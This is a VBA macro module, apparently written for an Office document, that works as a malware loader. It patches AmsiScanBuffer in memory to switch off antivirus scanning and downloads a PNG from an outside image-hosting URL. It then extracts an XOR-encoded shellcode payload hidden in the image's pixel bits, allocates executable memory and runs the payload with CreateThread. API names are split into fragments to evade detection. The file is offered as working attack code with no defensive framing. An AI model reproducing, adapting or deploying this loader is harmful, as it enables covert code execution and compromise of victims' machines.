Option Explicit

Private Declare PtrSafe Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal n As String) As LongPtr
Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal h As LongPtr, ByVal n As String) As LongPtr
Private Declare PtrSafe Function VProt Lib "kernel32" Alias "VirtualProtect" (ByVal a As LongPtr, ByVal s As Long, ByVal n As Long, ByRef o As Long) As Long
Private Declare PtrSafe Sub MoveMem Lib "kernel32" Alias "RtlMoveMemory" (ByVal d As LongPtr, ByVal s As LongPtr, ByVal l As Long)
Private Declare PtrSafe Function CallPtr Lib "user32" Alias "CallWindowProcA" (ByVal p As LongPtr, ByVal h As LongPtr, ByVal m As Long, ByVal w As LongPtr, ByVal l As LongPtr) As LongPtr

#If VBA7 Then
    Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
        ByVal lpThreadAttributes As LongPtr, _
        ByVal dwStackSize As Long, _
        ByVal lpStartAddress As LongPtr, _
        lpParameter As LongPtr, _
        ByVal dwCreationFlags As Long, _
        lpThreadId As Long) As LongPtr
#Else
    Private Declare Function CreateThread Lib "kernel32" ( _
        ByVal lpThreadAttributes As Long, _
        ByVal dwStackSize As Long, _
        ByVal lpStartAddress As Long, _
        lpParameter As Long, _
        ByVal dwCreationFlags As Long, _
        lpThreadId As Long) As Long
#End If

Sub DisableAMSI()
    On Error Resume Next
    Dim hAmsi As LongPtr, pAddr As LongPtr, oldProt As Long
    ' Инструкция для x64: xor eax, eax; ret (возвращает AMSI_RESULT_CLEAN)
    Dim patch(3) As Byte: patch(0) = &H48: patch(1) = &H31: patch(2) = &HC0: patch(3) = &HC3
    
    hAmsi = GetModuleHandle("am" & "si.d" & "ll")
    pAddr = GetProcAddress(hAmsi, "Am" & "siSca" & "nBuf" & "fer")
    
    If pAddr <> 0 Then
        VProt pAddr, 5, &H40, oldProt
        MoveMem pAddr, VarPtr(patch(0)), 4
        VProt pAddr, 5, oldProt, oldProt
    End If
End Sub

' Function to download the file from the internet to a local path
Function DownloadFile(URL As String, LocalPath As String) As Boolean
    Dim WinHttpReq As Object
    On Error Resume Next
    
    ' Initialize XMLHTTP object
    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
    WinHttpReq.Open "GET", URL, False
    WinHttpReq.Send
    
    ' Check if request was successful
    If WinHttpReq.Status = 200 Then
        Dim oStream As Object
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1 ' adTypeBinary
        oStream.Write WinHttpReq.ResponseBody
        oStream.SaveToFile LocalPath, 2 ' adSaveCreateOverWrite
        oStream.Close
        DownloadFile = True
    Else
        DownloadFile = False
    End If
End Function

' Main extraction procedure
Function DownloadAndExtract() As Byte()

    DisableAMSI

    Dim imgURL As String
    Dim tempPath As String
    Dim xorKey As Byte
    Dim offsetPixels As Long
    
    ' --- CONFIGURATION ---
    ' Make sure these match your Python script settings
    imgURL = "https://i.postimg.cc/1sJtzsLK/o4.png?dl=1" ' Direct link to your PNG
    tempPath = Environ("TEMP") & "\downloaded_payload.png"
    xorKey = &H77
    offsetPixels = 20
    ' ---------------------
    
    ' 1. Download the image
    If Not DownloadFile(imgURL, tempPath) Then
        MsgBox "Error: Could not download file from the provided URL!", vbCritical
        Exit Function
    End If
    
    Dim img As Object, px As Object
    Set img = CreateObject("WIA.ImageFile")
    img.LoadFile tempPath
    Set px = img.ARGBData
    
    Dim bitBuffer As Long, bitCount As Integer, byteCount As Long
    Dim totalTargetBytes As Long: totalTargetBytes = 4 ' Сначала ищем длину
    Dim shellcode() As Byte: ReDim shellcode(3)
    Dim lengthFound As Boolean: lengthFound = False
    
    Dim i As Long, c As Integer, pixelVal As Long, rgb(2) As Byte
    
    ' Основной цикл по пикселям после отступа
    For i = offsetPixels + 1 To px.Count
    pixelVal = px.Item(i)
    
    ' Извлекаем байты без ошибок переполнения
    ' Используем маски, чтобы получить чистые значения 0-255
    rgb(0) = CByte(((pixelVal And &HFF0000) \ &H10000) And &HFF)
    rgb(1) = CByte(((pixelVal And &HFF00) \ &H100) And &HFF)
    rgb(2) = CByte(pixelVal And &HFF)
    
    ' ВНИМАНИЕ: Python PIL (RGB) -> VBA WIA (ARGB)
    ' Если данные не читаются, попробуйте поменять цикл на: For c = 2 To 0 Step -1
    For c = 0 To 2
        If (rgb(c) And 1) = 1 Then
            bitBuffer = bitBuffer Or (2 ^ bitCount)
        End If
        bitCount = bitCount + 1
        
        If bitCount = 8 Then
            ' Расшифровываем байт
            Dim decodedByte As Byte
            decodedByte = CByte(bitBuffer Xor xorKey)
            
            ' Сохраняем в массив
            shellcode(byteCount) = decodedByte
            byteCount = byteCount + 1
            
            ' Сбрасываем буфер
            bitBuffer = 0
            bitCount = 0
            
            ' Проверка длины после первых 4 байт
            If byteCount = 4 And lengthFound = False Then
                totalTargetBytes = CLng(CDbl(shellcode(0)) + _
                                        CDbl(shellcode(1)) * 256# + _
                                        CDbl(shellcode(2)) * 65536# + _
                                        CDbl(shellcode(3)) * 16777216#)
                
                If totalTargetBytes > 0 And totalTargetBytes < 1000000 Then
                    ReDim Preserve shellcode(totalTargetBytes + 3)
                    lengthFound = True
                Else
                    MsgBox "Ошибка: Неверная длина (" & totalTargetBytes & ")", vbCritical
                    Exit Function
                End If
            End If
            
            ' Если вытащили всё
            If lengthFound And byteCount = totalTargetBytes + 4 Then GoTo SuccessDownloadAndExtract
        End If
    Next c
Next i
    
SuccessDownloadAndExtract:

    Dim cleanData() As Byte
    ReDim cleanData(totalTargetBytes - 1)
        
    Dim k As Long
    For k = 0 To totalTargetBytes - 1
        cleanData(k) = shellcode(k + 4)
    Next k
        
    Kill tempPath
    
    DownloadAndExtract = cleanData
    
End Function

Sub Init()
    Dim finalPayload() As Byte
    finalPayload = DownloadAndExtract()
    
    ' Visual test part
    Dim finalResultString As String
    Dim finalResultHex As String
    Dim k As Long
    
    For k = 0 To UBound(finalPayload)
        finalResultString = finalResultString & Chr(finalPayload(k))
        finalResultHex = finalResultHex & Right("0" & Hex(finalPayload(k)), 2) & " "
    Next k
    
    With Sheets(1)
        .Range("A1").Value = finalResultString
        .Range("A2").Value = finalResultHex
        .Columns("A").AutoFit
        
    End With
    ' Visual test part
    
    Dim hKern As LongPtr: hKern = GetModuleHandle("ker" & "nel32")
    Dim pAlloc As LongPtr: pAlloc = GetProcAddress(hKern, "Vi" & "rtual" & "Al" & "loc")
    Dim pEnum As LongPtr: pEnum = GetProcAddress(hKern, "Enum" & "Date" & "FormatsA")
    
    ' Dim addr As LongPtr
    ' addr = CallPtr(pAlloc, 0, UBound(finalPayload) + 1, &H3000, &H40)
    
    ' If addr <> 0 Then
    '    MoveMem addr, VarPtr(finalPayload(0)), UBound(finalPayload) + 1
    '    CallPtr pEnum, addr, 1024, 0, 0
    ' End If
    
    Dim addr As LongPtr
    Dim hThread As LongPtr
    Dim threadId As Long

    ' 1. Allocate memory for the payload
    addr = CallPtr(pAlloc, 0, UBound(finalPayload) + 1, &H3000, &H40)
    
    If addr <> 0 Then
        ' 2. Move the payload into the allocated space
        MoveMem addr, VarPtr(finalPayload(0)), UBound(finalPayload) + 1
        
        ' 3. Start a new thread at the address of the payload
        ' Parameters: Security (0), Stack (0), Start Address (addr), Param (0), Flags (0), ID Out
        hThread = CreateThread(0, 0, addr, 0, 0, threadId)
        
        If hThread = 0 Then
            MsgBox "Failed to create thread."
        End If
    End If
    
End Sub





